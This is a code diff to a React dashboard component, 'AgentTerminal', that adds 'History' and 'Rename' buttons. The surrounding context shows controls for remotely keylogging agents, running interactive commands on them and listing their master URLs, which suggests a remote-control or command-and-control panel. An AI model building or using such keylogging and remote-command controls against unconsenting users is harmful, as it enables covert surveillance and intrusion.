@@ -9,9 +9,9 @@ import MastersPanel from './MastersPanel'
 
 type Agent = { agent_id: string; name: string; has_camera?: boolean }
 
-type Props = { agent: Agent; onClose: () => void }
+type Props = { agent: Agent; onClose: () => void; onOpenHistory?: (agentId: string) => void }
 
-export default function AgentTerminal({ agent, onClose }: Props) {
+export default function AgentTerminal({ agent, onClose, onOpenHistory }: Props) {
   const [linesArr, setLinesArr] = useState<string[][]>([[]])
   const lastPaneRef = useRef<number>(0)
   const lastLineRefs = useRef<string[]>([''])
@@ -252,6 +252,8 @@ export default function AgentTerminal({ agent, onClose }: Props) {
           <button className="btn secondary" onClick={() => { if (confirm('Hard reset the agent connection? This will drop and reconnect.')) { dashboardSocket.hardReset(agent.agent_id); setLines((prev) => [...prev, '[Hard reset requested]']); } }}>Hard Reset</button>
           <button className="btn secondary" onClick={() => { if (!showKeylog) { dashboardSocket.startKeylog(agent.agent_id) } else { dashboardSocket.stopKeylog(agent.agent_id) } setShowKeylog(!showKeylog) }}>{showKeylog ? 'Hide Keylog' : 'Start Keylog'}</button>
           <button className="btn secondary" onClick={() => { setMastersOpen(true); dashboardSocket.sendAgentJson(agent.agent_id, { type: 'masters_list' }) }}>Agent URLs</button>
+          <button className="btn secondary" onClick={() => onOpenHistory && onOpenHistory(agent.agent_id)}>History</button>
+          <button className="btn secondary" onClick={() => { const newAlias = prompt('Alias for this agent (leave empty to clear):', (agent as any).alias || agent.name || ''); if (newAlias !== null) { fetch(`${apiBase}/admin/agents/${encodeURIComponent(agent.agent_id)}/alias`, { method: 'POST', headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` }, body: JSON.stringify({ alias: newAlias || null }) }).catch(()=>{}); } }}>Rename</button>
           <input className="input" placeholder="Interactive command (e.g., python game.py)" value={icmd} onChange={(e) => setIcmd(e.target.value)} style={{ width: 260 }} />
           {!interactive ? (
             <button className="btn" onClick={() => { const c = (icmd || '').trim(); if (!c) return; setInteractive(true); dashboardSocket.startInteractive(agent.agent_id, c); }}>Start Interactive</button>
